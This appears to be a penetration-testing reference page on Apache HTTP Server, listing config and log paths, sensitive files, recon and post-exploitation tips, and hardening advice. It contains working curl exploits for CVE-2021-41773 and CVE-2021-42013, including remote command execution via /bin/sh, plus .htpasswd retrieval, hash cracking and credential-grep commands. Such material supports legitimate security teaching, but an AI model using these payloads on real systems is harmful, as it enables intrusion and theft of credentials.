# Apache HTTP Server

!!! info "Information"
    **Category:** Web Server  
    **Tags:** 'web' 'http' 'server' 'apache'  
    **Criticality:** 🔴 High

## Description

Apache HTTP Server is the world's most popular open-source web server. It has been used to host websites and applications on the Internet since 1995. Apache is known for its flexibility, robustness, and modular architecture.

---

## Configuration Files

=== "Linux (Debian/Ubuntu)"
    ```bash
    # Main configuration
    /etc/apache2/apache2.conf
    /etc/apache2/envvars
    
    # Available and enabled sites
    /etc/apache2/sites-available/
    /etc/apache2/sites-enabled/
    
    # Modules
    /etc/apache2/mods-available/
    /etc/apache2/mods-enabled/
    
    # Additional configuration
    /etc/apache2/conf-available/
    /etc/apache2/conf-enabled/
    
    # Ports
    /etc/apache2/ports.conf
    ```

=== "Linux (RedHat/CentOS)"
    ```bash
    # Main configuration
    /etc/httpd/conf/httpd.conf
    
    # Additional configuration
    /etc/httpd/conf.d/
    /etc/httpd/conf.modules.d/
    
    # Virtual hosts
    /etc/httpd/conf.d/vhost.conf
    ```

=== "Windows"
    ```powershell
    # Standard installation
    C:\Apache24\conf\httpd.conf
    C:\Apache24\conf\extra\
    
    # XAMPP
    C:\xampp\apache\conf\httpd.conf
    C:\xampp\apache\conf\extra\httpd-vhosts.conf
    
    # WAMP
    C:\wamp64\bin\apache\apache2.x.x\conf\httpd.conf
    ```

=== "macOS"
    ```bash
    # System installation
    /etc/apache2/httpd.conf
    /etc/apache2/extra/
    
    # Homebrew
    /usr/local/etc/httpd/httpd.conf
    /opt/homebrew/etc/httpd/httpd.conf
    ```

---

## Log Files

```bash
# Debian/Ubuntu
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/apache2/other_vhosts_access.log

# RedHat/CentOS
/var/log/httpd/access_log
/var/log/httpd/error_log

# Windows (XAMPP)
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
```

---

## Sensitive Files

!!! danger "Credentials and sensitive data"
    The following files may contain critical information:
    
    - `.htpasswd` - Password files (Basic Auth)
    - `.htaccess` - Configuration rules and redirections
    - `ssl/private/*.key` - SSL/TLS private keys
    - `conf.d/*-secrets.conf` - Configurations with secrets
    - `/etc/apache2/envvars` - Environment variables

!!! warning "Backup files"
    Don't forget to check for backups:
    
    - `*.conf~`
    - `*.conf.bak`
    - `*.conf.old`
    - `*.conf.backup`
    - `*.conf.save`

---

## Web Directories

```bash
# Debian/Ubuntu
/var/www/html/
/var/www/

# RedHat/CentOS
/var/www/html/
/usr/share/httpd/

# Windows (XAMPP)
C:\xampp\htdocs\

# macOS
/Library/WebServer/Documents/
```

---

## Pentest Tips

!!! tip "Reconnaissance"
    - Identify version via HTTP headers: `Server: Apache/2.4.41`
    - Check loaded modules: `apache2 -M` or `httpd -M`
    - Scan ports: 80 (HTTP), 443 (HTTPS), 8080, 8443

!!! tip "Enumeration"
    - Look for exposed directories: `.git/`, `.svn/`, `backup/`
    - Test for sensitive files: `.htaccess`, `.htpasswd`, `phpinfo.php`
    - Identify VirtualHosts via SNI or Host header manipulation
    - List files in `/icons/`, `/manual/` if enabled

!!! tip "Exploitation"
    - **Path Traversal**: Test `../../../etc/passwd` if misconfigured
    - **Server-Side Includes (SSI)**: Look for `.shtml` files
    - **CGI Scripts**: Check `/cgi-bin/` for shellshock or other vulns
    - **Mod_rewrite**: Analyze rules for authentication bypass

!!! tip "Post-Exploitation"
    - Extract credentials from `.htpasswd` (MD5 hash)
    - Analyze logs to find other targets
    - Search for tokens/API keys in config files
    - Identify hosted applications via VirtualHosts

---

## Useful Commands

```bash
# Check if Apache is running
systemctl status apache2  # Debian/Ubuntu
systemctl status httpd    # RedHat/CentOS
ps aux | grep apache

# Test configuration
apache2ctl configtest     # Debian/Ubuntu
httpd -t                  # RedHat/CentOS

# List loaded modules
apache2ctl -M             # Debian/Ubuntu
httpd -M                  # RedHat/CentOS

# Locate configuration files
find / -name "apache*.conf" 2>/dev/null
find / -name "httpd.conf" 2>/dev/null
locate apache2.conf

# Search for credentials
grep -r "password" /etc/apache2/ 2>/dev/null
grep -r "Auth" /etc/apache2/ 2>/dev/null

# Read logs in real-time
tail -f /var/log/apache2/access.log
tail -f /var/log/apache2/error.log
```

---

## Known Vulnerabilities

??? danger "CVE-2021-41773 - Path Traversal"
    Critical vulnerability allowing arbitrary file reading.
    
    **Affected versions:** Apache 2.4.49  
    **Exploit:**
    ```bash
    curl http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
    ```

??? danger "CVE-2021-42013 - RCE via Path Traversal"
    Bypass of CVE-2021-41773 patch allowing code execution.
    
    **Affected versions:** Apache 2.4.49, 2.4.50  
    **Exploit:**
    ```bash
    curl 'http://target/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' -d 'echo Content-Type: text/plain; echo; id'
    ```

---

## Hardening

!!! success "Best practices"
    - Disable server signature: `ServerTokens Prod` and `ServerSignature Off`
    - Restrict access to sensitive directories via `.htaccess`
    - Use HTTPS with valid certificates (Let's Encrypt)
    - Disable unused modules: `a2dismod [module]`
    - Limit request size: `LimitRequestBody`
    - Enable ModSecurity (WAF)
    - Keep Apache regularly updated

---

## References

- [Apache HTTP Server Documentation](https://httpd.apache.org/docs/)
- [OWASP Web Server Configuration](https://cheatsheetseries.owasp.org/cheatsheets/Apache_Configuration_Cheat_Sheet.html)
- [Apache CVE List](https://httpd.apache.org/security/vulnerabilities_24.html)
- [HackerOne Apache Reports](https://hackerone.com/apache)

---

## Exploitation Examples

??? example "Reading .htpasswd"
    ```bash
    # If directory is misconfigured
    curl http://target/.htpasswd
    
    # Hash found
    admin:$apr1$ABC123$xyz...
    
    # Crack with John
    john --wordlist=/usr/share/wordlists/rockyou.txt htpasswd.txt
    ```

??? example "VirtualHost Enumeration"
    ```bash
    # Via Host header
    for vhost in www admin api dev staging; do
        curl -H "Host: $vhost.target.com" http://target-ip/
    done
    
    # Via gobuster
    gobuster vhost -u http://target.com -w vhosts.txt
    ```

---

## Metadata

- **Template version:** 1.0
- **Last updated:** November 2024
- **Contributor:** EpiHack Benin
- **Sources verified:** Yes